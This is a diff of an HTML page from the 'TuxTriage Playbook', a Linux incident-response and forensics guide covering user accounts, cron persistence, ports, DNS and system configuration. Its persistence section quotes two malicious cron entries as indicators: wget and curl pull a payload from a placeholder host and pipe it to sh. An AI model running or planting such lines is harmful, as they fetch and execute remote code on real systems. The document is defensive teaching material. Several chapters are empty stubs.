@@ -84,7 +84,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="index.html">Introduction</a></li><li class="chapter-item expanded affix "><a href="recommended_reading.html">Recommended Reading</a></li><li class="chapter-item expanded affix "><a href="incident_handling.html">Incident Handling</a></li><li class="chapter-item expanded "><a href="os_accounts.html"><strong aria-hidden="true">1.</strong> User Accounts</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="os_accounts_local.html"><strong aria-hidden="true">1.1.</strong> Local User Accounts</a></li><li class="chapter-item expanded "><a href="os_accounts_ad.html"><strong aria-hidden="true">1.2.</strong> Active Directory Accounts</a></li><li class="chapter-item expanded "><a href="os_accounts_forensics.html"><strong aria-hidden="true">1.3.</strong> Forensic Artifacts</a></li></ol></li><li class="chapter-item expanded "><a href="lateral_movement.html"><strong aria-hidden="true">2.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="persistence.html"><strong aria-hidden="true">3.</strong> Persistence</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="persistence_cron.html"><strong aria-hidden="true">3.1.</strong> Cron Jobs</a></li><li class="chapter-item expanded "><a href="persistence_systemd.html"><strong aria-hidden="true">3.2.</strong> Systemd Services</a></li><li class="chapter-item expanded "><a href="persistence_scripts.html"><strong aria-hidden="true">3.3.</strong> Scripts</a></li><li class="chapter-item expanded "><a href="persistence_forensics.html"><strong aria-hidden="true">3.4.</strong> Forensic Artifacts</a></li></ol></li><li class="chapter-item expanded "><a href="execution.html"><strong aria-hidden="true">4.</strong> Execution</a></li><li class="chapter-item expanded "><a href="network.html"><strong aria-hidden="true">5.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="webhistory.html"><strong aria-hidden="true">5.1.</strong> Web History</a></li><li class="chapter-item expanded "><a href="open_ports.html"><strong aria-hidden="true">5.2.</strong> Open Ports</a></li><li class="chapter-item expanded "><a href="active_connections.html"><strong aria-hidden="true">5.3.</strong> Active Connections</a></li><li class="chapter-item expanded "><a href="dns_cache.html"><strong aria-hidden="true">5.4.</strong> DNS Cache records</a></li></ol></li><li class="chapter-item expanded "><a href="exfiltration.html"><strong aria-hidden="true">6.</strong> Data Exfiltration</a></li><li class="chapter-item expanded "><a href="config.html"><strong aria-hidden="true">7.</strong> System Configuration</a></li><li class="chapter-item expanded "><a href="applications.html"><strong aria-hidden="true">8.</strong> Installed Applications</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="index.html">Introduction</a></li><li class="chapter-item expanded affix "><a href="recommended_reading.html">Recommended Reading</a></li><li class="chapter-item expanded affix "><a href="incident_handling.html">Incident Handling</a></li><li class="chapter-item expanded "><a href="os_accounts.html"><strong aria-hidden="true">1.</strong> User Accounts</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="os_accounts_local.html"><strong aria-hidden="true">1.1.</strong> Local User Accounts</a></li><li class="chapter-item expanded "><a href="os_accounts_ad.html"><strong aria-hidden="true">1.2.</strong> Active Directory Accounts</a></li><li class="chapter-item expanded "><a href="os_accounts_forensics.html"><strong aria-hidden="true">1.3.</strong> Forensic Artifacts</a></li></ol></li><li class="chapter-item expanded "><a href="lateral_movement.html"><strong aria-hidden="true">2.</strong> Lateral Movement</a></li><li class="chapter-item expanded "><a href="persistence.html"><strong aria-hidden="true">3.</strong> Persistence</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="persistence_cron.html"><strong aria-hidden="true">3.1.</strong> Cron Jobs</a></li><li class="chapter-item expanded "><a href="persistence_systemd.html"><strong aria-hidden="true">3.2.</strong> Systemd Services</a></li><li class="chapter-item expanded "><a href="persistence_scripts.html"><strong aria-hidden="true">3.3.</strong> Scripts</a></li><li class="chapter-item expanded "><a href="persistence_forensics.html"><strong aria-hidden="true">3.4.</strong> Forensic Artifacts</a></li></ol></li><li class="chapter-item expanded "><a href="execution.html"><strong aria-hidden="true">4.</strong> Execution</a></li><li class="chapter-item expanded "><a href="network.html"><strong aria-hidden="true">5.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="webhistory.html"><strong aria-hidden="true">5.1.</strong> Web History</a></li><li class="chapter-item expanded "><a href="open_ports.html"><strong aria-hidden="true">5.2.</strong> Open Ports</a></li><li class="chapter-item expanded "><a href="active_connections.html"><strong aria-hidden="true">5.3.</strong> Active Connections</a></li><li class="chapter-item expanded "><a href="dns_cache.html"><strong aria-hidden="true">5.4.</strong> DNS Cache records</a></li></ol></li><li class="chapter-item expanded "><a href="exfiltration.html"><strong aria-hidden="true">6.</strong> Data Exfiltration</a></li><li class="chapter-item expanded "><a href="log_analysis.html"><strong aria-hidden="true">7.</strong> Log Analysis</a></li><li class="chapter-item expanded "><a href="config.html"><strong aria-hidden="true">8.</strong> System Configuration</a></li><li class="chapter-item expanded "><a href="applications.html"><strong aria-hidden="true">9.</strong> Installed Applications</a></li><li class="chapter-item expanded "><a href="datasource_catalog.html"><strong aria-hidden="true">10.</strong> Datasource Catalog</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><a href="about.html">About</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -146,25 +146,48 @@
                 <div id="content" class="content">
                     <main>
                         <h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
-<p><strong>TuxTriage Playbook</strong> is an incident response playbook specifically targeting the Linux Operating Systems. The primary objective of this playbook is to help triage a live suspicious host. Following this playbook will allow an examiner to rapidly triage an incident and gather evidence to support their claims. </p>
-<p><strong>TuxTriage Playbook</strong> will attempt to answer the following questions about a suspicious host:</p>
+<p>In the current digital environment, robust and targeted incident response strategies are necessary to tackle the range of cyber threats organizations face. Despite Linux systems' inherent security strengths, they remain potential targets for attackers. Therefore, It is important to have a Linux-specific incident response playbook, which is the purpose of the <strong>TuxTriage Playbook</strong>.</p>
+<p>The <strong>TuxTriage Playbook</strong> is an incident response playbook specifically developed for the Linux Operating Systems. It facilitates the triage and examination of suspicious live hosts, allowing for swift incident identification, triage, and evidence collection.</p>
+<p>The playbook addresses several key investigative points that can aid an examiner in understanding the extent of a potential breach:</p>
 <ul>
 <li>
-<p><strong>User accounts</strong>: What user accounts are present on the system? What are their permissions? Have any user accounts been created or modified recently?</p>
+<p><strong>User Accounts</strong>: This section aims to identify all user accounts on the system, their respective permissions, and any recent account modifications. These details can reveal unauthorized system access.</p>
 </li>
 <li>
-<p><strong>Lateral movemen</strong>t: Has the attacker been able to move laterally to other systems on the network? If so, how did they do it?</p>
+<p><strong>Lateral Movement</strong>: The playbook evaluates if the attacker has managed to gain access to other systems in the network. Identifying the tactics used in this movement can help improve defense mechanisms.</p>
 </li>
 <li>
-<p><strong>Malware persistence</strong>: How has the malware persisted on the system? Is it using any known techniques, such as autoruns?</p>
+<p><strong>Malware Persistence</strong>: This segment assesses how malware has managed to persist on the system, including using known persistence techniques such as auto-runs, allowing for a comprehensive malware investigation and removal process.</p>
 </li>
 <li>
-<p><strong>Data theft</strong>: Has the attacker attempted to access any data from the system?</p>
+<p><strong>Data Theft</strong>: The playbook investigates whether the attacker has attempted to access data within the system. This information is crucial in understanding the scope of the breach and informing recovery efforts.</p>
 </li>
 <li>
-<p><strong>Configuration management</strong>: What is the current state of the system's configuration? Have any changes been made to the system recently?</p>
+<p><strong>Configuration Management</strong>: The final section evaluates the current state of the system's configuration, detecting recent modifications that may indicate system compromise.</p>
 </li>
 </ul>
+<p>By addressing each of these areas, the TuxTriage Playbook provides a rapid response protocol for incidents and informs long-term strategies for system hardening and threat prevention. This playbook is essential in navigating the challenges of Linux system breaches, ensuring a swift and effective incident response.</p>
+<h2 id="how-to-use-this-book"><a class="header" href="#how-to-use-this-book">How to use this book?</a></h2>
+<p>This book has been designed to be both a comprehensive guide and a handy reference manual for anyone interested in intrusion analysis. It provides a deep dive into raw files, data structures, and forensics artifacts, serving as a rich resource for both beginners and seasoned professionals in the field. Please take a moment to read through the following guidelines to make the most out of this resource.</p>
+<p><strong>Start with Basics</strong>: If you are a beginner or need a refresher on the basic concepts, start from the first chapters that detail the raw files and data structures used in intrusion analysis.</p>
+<p><strong>Understand the Data Structures</strong>: This book discusses data structures and file formats in detail. Ensure you understand these since they form the crux of many analyses that follow. The objective is to understand the file's contents and its limitations comprehensively.</p>
+<p><strong>Explore Forensic Artifacts</strong>: Details about forensic artifacts that may be relevant to intrusion analysis are provided under each section of the book. These chapters can be instrumental in your practical work, allowing you to identify better, analyze, and interpret forensics artifacts during intrusion analysis.</p>
+<p><strong>Refer to the Datasource Catalog</strong>: The Datasource Catalog section serves as a quick reference guide for all files of interest mentioned in the book. It briefly describes each file and its significance in intrusion analysis. You can refer to this section when encountering unfamiliar files or need to understand a file's relevance quickly.</p>
+<p><strong>Recognize System-Specific Limitations</strong>: Please note that some files discussed in this book may not exist on certain systems based on their specific configurations. If you encounter this, don't be alarmed. This book aims to be as comprehensive as possible, but the nature of diverse system configurations means that not all files will be present on all systems.</p>
+<p><strong>Minimized Use of System Commands</strong>: This book diverges from many other resources on the subject matter by largely refraining from using built-in system commands, save for the inspection of file contents using the <code>cat</code> command. This approach is adopted for several critical reasons:</p>
+<ul>
+<li>
+<p><strong>Preservation of Evidence</strong>: To maintain the integrity of the investigation, we should avoid tampering with the system's state. Running various commands may inadvertently alter the system's state under scrutiny, potentially impacting the reliability of the evidence.</p>
+</li>
+<li>
+<p><strong>Compatibility with Disk Images</strong>: The utilization of disk images is a common practice in digital forensics. Within this context, executing commands is typically unfeasible. By focusing on raw files and data structures, this book ensures its teachings are applicable even when working with disk images.</p>
+</li>
+<li>
+<p><strong>Enabling Evidence Extraction</strong>: This book provides the knowledge necessary to extract relevant files from the system and conduct detailed analyses on a separate forensic workstation by focusing on raw files and data structures. This method ensures the preservation of the original evidence and enhances the overall investigative process by providing more flexibility and control over the analysis environment.</p>
+</li>
+</ul>
+<p>This book is designed to be a journey into the heart of intrusion analysis, taking you from the basics to the complexities of forensic artifacts. By studying, practicing, and understanding the principles within, you'll be well-prepared to tackle real-world intrusion analysis tasks and challenges. </p>
+<p>Happy hunting!</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="recommended-reading"><a class="header" href="#recommended-reading">Recommended Reading</a></h1>
 <p>The following resources provide substansial background on the cyber incident response process. </p>
 <h2 id="cisa-cybersecurity-incident--vulnerability-response-playbooks-1"><a class="header" href="#cisa-cybersecurity-incident--vulnerability-response-playbooks-1">CISA: Cybersecurity Incident &amp; Vulnerability Response Playbooks <sup class="footnote-reference"><a href="#cisa">1</a></sup></a></h2>
@@ -183,13 +206,13 @@
 <li>CERTs </li>
 </ul>
 <div class="footnote-definition" id="cisa"><sup class="footnote-definition-label">1</sup>
-<p>https://www.cisa.gov/sites/default/files/publications/Federal_Government_Cybersecurity_Incident_and_Vulnerability_Response_Playbooks_508C.pdf</p>
+<p><a href="https://www.cisa.gov/sites/default/files/publications/Federal_Government_Cybersecurity_Incident_and_Vulnerability_Response_Playbooks_508C.pdf">https://www.cisa.gov/sites/default/files/publications/Federal_Government_Cybersecurity_Incident_and_Vulnerability_Response_Playbooks_508C.pdf</a></p>
 </div>
 <div class="footnote-definition" id="nist"><sup class="footnote-definition-label">2</sup>
-<p>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf </p>
+<p><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf">https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf</a> </p>
 </div>
 <div class="footnote-definition" id="SG"><sup class="footnote-definition-label">3</sup>
-<p>https://github.com/certsocietegenerale/IRM/blob/main/EN/IRM-3-UnixLinuxIntrusionDetection.pdf</p>
+<p><a href="https://github.com/certsocietegenerale/IRM/blob/main/EN/IRM-3-UnixLinuxIntrusionDetection.pdf">https://github.com/certsocietegenerale/IRM/blob/main/EN/IRM-3-UnixLinuxIntrusionDetection.pdf</a></p>
 </div>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="incident-handling-steps"><a class="header" href="#incident-handling-steps">Incident Handling Steps</a></h1>
 <p>The incident response life cycle as defined by NIST Computer Security
@@ -208,11 +231,16 @@ This playbook is designed as a training guide for analysts working with Linux OS
 <p>Signs of an incident fall into one of two categories: <em>precursors</em> and <em>indicators</em>. A precursor is a sign that an incident may occur in the future. An indicator is a sign that an incident may have occurred or may be
 occurring now <sup class="footnote-reference"><a href="#nist">1</a></sup>.</p>
 <p>The playbook serves as a handbook and provides the sources for <em>indicators</em>. It details where to look for indicators, what conclusions can be drawn from the indicators as well as the data structure and organization of such artifacts. </p>
+<h2 id="todo"><a class="header" href="#todo">TODO</a></h2>
+<ul>
+<li>Add the incident response process picture </li>
+<li>Explain the process in detail </li>
+</ul>
 <div class="footnote-definition" id="nist"><sup class="footnote-definition-label">1</sup>
-<p>https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf </p>
+<p><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf">https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf</a></p>
 </div>
 <div class="footnote-definition" id="SG"><sup class="footnote-definition-label">2</sup>
-<p>https://github.com/certsocietegenerale/IRM/blob/main/EN/IRM-3-UnixLinuxIntrusionDetection.pdf</p>
+<p><a href="https://github.com/certsocietegenerale/IRM/blob/main/EN/IRM-3-UnixLinuxIntrusionDetection.pdf">https://github.com/certsocietegenerale/IRM/blob/main/EN/IRM-3-UnixLinuxIntrusionDetection.pdf</a></p>
 </div>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="user-accounts"><a class="header" href="#user-accounts">User Accounts</a></h1>
 <p>User accounts are a crucial component of any digital forensics investigation. They provide valuable information about who had access to a system, what they did while logged in, and what resources they may have accessed. </p>
@@ -328,22 +356,22 @@ coaching-staff:!::tlasso
 <h2 id="user-account-creation"><a class="header" href="#user-account-creation">User account creation</a></h2>
 <p>Please refer to RHEL<sup class="footnote-reference"><a href="#rhel_doc">6</a></sup> documentation for details and command references for user creation. </p>
 <div class="footnote-definition" id="rhel_doc"><sup class="footnote-definition-label">6</sup>
-<p>https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/s2-users-cl-tools</p>
+<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/s2-users-cl-tools">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/s2-users-cl-tools</a></p>
 </div>
 <div class="footnote-definition" id="nxcraft"><sup class="footnote-definition-label">2</sup>
-<p>https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</p>
+<p><a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</a></p>
 </div>
 <div class="footnote-definition" id="rhel_pswd"><sup class="footnote-definition-label">1</sup>
-<p>https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s2-acctsgrps-files#s3-acctsgrps-passwd</p>
+<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s2-acctsgrps-files#s3-acctsgrps-passwd">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s2-acctsgrps-files#s3-acctsgrps-passwd</a></p>
 </div>
 <div class="footnote-definition" id="rhel_shdw"><sup class="footnote-definition-label">3</sup>
-<p>https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctsgrps-shadow</p>
+<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctsgrps-shadow">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctsgrps-shadow</a></p>
 </div>
 <div class="footnote-definition" id="rhel_grp"><sup class="footnote-definition-label">4</sup>
-<p>https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctspgrps-group</p>
+<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctspgrps-group">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctspgrps-group</a></p>
 </div>
 <div class="footnote-definition" id="rhel_grp_shdw"><sup class="footnote-definition-label">5</sup>
-<p>https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctsgrps-gshadow</p>
+<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctsgrps-gshadow">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/introduction_to_system_administration/s3-acctsgrps-gshadow</a></p>
 </div>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory-accounts"><a class="header" href="#active-directory-accounts">Active Directory Accounts</a></h1>
 <p>Active directory accounts are managed by the AD server. No local entries are manintained by the host regarding them. </p>
@@ -366,7 +394,7 @@ coaching-staff:!::tlasso
 <p>Windows uses security ids (SID) and is incompatible with Linux UID/SID. SSSD autogenerates the UID and GID from the SIDs when the user logs on to a linux host for the first time. This information is cached as mentioned above. Note that the UID generated from a SID is always the same. </p>
 <p>ID mapping can be disabled. This should be used if AD defined POSIX attributes are to be used instead. </p>
 <div class="footnote-definition" id="rhel_sssd"><sup class="footnote-definition-label">1</sup>
-<p>https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_authentication_and_authorization_in_rhel/understanding-sssd-and-its-benefits_configuring-authentication-and-authorization-in-rhel</p>
+<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_authentication_and_authorization_in_rhel/understanding-sssd-and-its-benefits_configuring-authentication-and-authorization-in-rhel">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_authentication_and_authorization_in_rhel/understanding-sssd-and-its-benefits_configuring-authentication-and-authorization-in-rhel</a></p>
 </div>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="forensic-artifacts"><a class="header" href="#forensic-artifacts">Forensic Artifacts</a></h1>
 <p>There exists a number of utility programs that can generate the information listed below such as <code>wbinfo</code> and <code>getent</code>. Since we are interested in forensic evidence artifacts that can be collected and reviewed offline the focus here is to examine the file contents directly. This is also required when we are presented with a disk image of a system and not the live running system.</p>
@@ -617,9 +645,12 @@ distinguishedName: name=nate@corp.tuxtriage.net,cn=users,cn=corp.tuxtriage.net
 <code>createTimestamp</code>: The create time for this user 
 <code>lastLogin</code>: Last logon timestamp for the user. </p>
 <div class="footnote-definition" id="ldb"><sup class="footnote-definition-label">1</sup>
-<p>https://linux.die.net/man/3/ldb </p>
+<p><a href="https://linux.die.net/man/3/ldb">https://linux.die.net/man/3/ldb</a></p>
 </div>
-<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="persistence"><a class="header" href="#persistence">Persistence</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="lateral-movement"><a class="header" href="#lateral-movement">Lateral movement</a></h1>
+<h1 id="ssh"><a class="header" href="#ssh">SSH</a></h1>
+<h1 id="screen-share-tools"><a class="header" href="#screen-share-tools">Screen share tools</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="persistence"><a class="header" href="#persistence">Persistence</a></h1>
 <p>Malware persistence is a technique used by malware to ensure that it remains on a system even after it has been rebooted or the user has logged off. This allows the malware to continue to run and execute its malicious code. Malware persistence is a critical part of many malware attacks. Without persistence, the malware would be easily removed by the user or by security software.</p>
 <p>Malware persistence on Linux systems is achieved through a variety of methods, including:</p>
 <ul>
@@ -673,13 +704,46 @@ distinguishedName: name=nate@corp.tuxtriage.net,cn=users,cn=corp.tuxtriage.net
 <p>The crontab files for individual users are stored in the /var/spool/cron directory. Each user's crontab file has the same name as the username.</p>
 <p>For example, if the username is <code>cbeard</code> the crontab file for that user would be located at <code>/var/spool/cron/cbeard</code>.</p>
 <p>Additionally, system-wide cron jobs are stored in the <code>/etc/crontab</code> file. The <code>/etc/cron.d/</code> directory is also used to store system-wide cron files, where each file represents a separate cron job.</p>
+<h2 id="scheduling-with-anacron"><a class="header" href="#scheduling-with-anacron">Scheduling with anacron</a></h2>
+<p><code>anacron</code> is similar to <code>cron</code> in that it is also used for running scheduled tasks. </p>
+<p>The primary difference between anacron and cron is how they handle missed or skipped jobs. In <code>cron</code>, if a system is powered off or inactive at the scheduled time of a task, the task will not be executed. <code>anacron</code> is designed to address this limitation by allowing the execution of missed tasks when the system becomes active again.</p>
+<p>System-wide tasks are defined in the main configuration file (<code>/etc/anacrontab</code>), while user-specific tasks are defined in separate per-user configuration files located in <code>/var/spool/anacron/</code></p>
+<h2 id="task-scheduling-using-the-at-command"><a class="header" href="#task-scheduling-using-the-at-command">Task scheduling using the 'at' command</a></h2>
+<p>The <code>at</code> command in can be used to schedule one-time tasks or commands to run at a specific time in the future. It is particularly useful for scheduling jobs that need to run only once, without any recurring pattern. </p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="systemd-services"><a class="header" href="#systemd-services">Systemd Services</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="scripts"><a class="header" href="#scripts">Scripts</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="forensic-artifacts-1"><a class="header" href="#forensic-artifacts-1">Forensic Artifacts</a></h1>
 <p>https://sandflysecurity.com/blog/linux-malware-persistence-with-cron/ </p>
 <p>*/11 * * * * wget -O - -q http://&lt;malicious_url&gt;/pics/logo.jpg|sh</p>
 <p>*/5 * * * * curl http://&lt;malicious_url&gt;/malicious.png -k|dd skip=2446 bs=1|sh</p>
-<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="system-configuration"><a class="header" href="#system-configuration">System Configuration</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="listening-ports"><a class="header" href="#listening-ports">Listening Ports</a></h1>
+<p><code>ss -l</code> </p>
+<p>TODO: Add details about the ss command. </p>
+<p><code>netstat -an</code> </p>
+<p>Only open ports 
+<code>netstat -tuln</code>
+<code>ss -tuln</code> </p>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="dns-cache"><a class="header" href="#dns-cache">DNS Cache</a></h1>
+<p>DNS records can provide crucial insights into network communications, identify malicious activities and uncover connections between compromised systems and C2 servers.</p>
+<p>Cache records can be found in the </p>
+<h3 id="configuration-files"><a class="header" href="#configuration-files">Configuration files</a></h3>
+<p>DNS-related configuration files may contain valuable information. </p>
+<p><code>/etc/resolv.conf</code>: Specifies the DNS servers used by the system.</p>
+<p><code>/etc/hosts</code>: Contains local hostname-to-IP mappings.</p>
+<h3 id="dns-caching-in-rhel"><a class="header" href="#dns-caching-in-rhel">DNS caching in RHEL</a></h3>
+<p>RHEL does not cache DNS queries by default<sup class="footnote-reference"><a href="#dns_default">1</a></sup>. RHEL also does not recommend using any resolvers<sup class="footnote-reference"><a href="#rhel_rec">2</a></sup>. This implies that DNS caching artifacts may not be available for analysis. </p>
+<p>DNS resolver </p>
+<p>cat /etc/resolv.conf</p>
+<p>Not much info on linux </p>
+<div class="footnote-definition" id="dns_default"><sup class="footnote-definition-label">1</sup>
+<p><a href="https://access.redhat.com/solutions/2189381">https://access.redhat.com/solutions/2189381</a></p>
+</div>
+<div class="footnote-definition" id="rhel_rec"><sup class="footnote-definition-label">2</sup>
+<p><a href="https://access.redhat.com/solutions/6985629">https://access.redhat.com/solutions/6985629</a></p>
+</div>
+<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="log-analysis"><a class="header" href="#log-analysis">Log Analysis</a></h1>
+<p>https://www.tecmint.com/query-audit-logs-using-ausearch-tool-on-centos-rhel/ </p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="system-configuration"><a class="header" href="#system-configuration">System Configuration</a></h1>
 <h2 id="file-system"><a class="header" href="#file-system">File System</a></h2>
 <h3 id="using-lsblk"><a class="header" href="#using-lsblk">Using lsblk</a></h3>
 <pre><code class="language-bash">[tlasso@rhel-richmondfc scripts]$ lsblk -f
@@ -715,7 +779,8 @@ UUID=D7C9-A9C8          /boot/efi               vfat    umask=0077,shortname=win
 /dev/mapper/rhel-swap   none                    swap    defaults        0 0
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="installed-applications"><a class="header" href="#installed-applications">Installed Applications</a></h1>
-
+<div style="break-before: page; page-break-before: always;"></div><h1 id="datasource-catalog"><a class="header" href="#datasource-catalog">Datasource Catalog</a></h1>
+<div style="break-before: page; page-break-before: always;"></div>
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
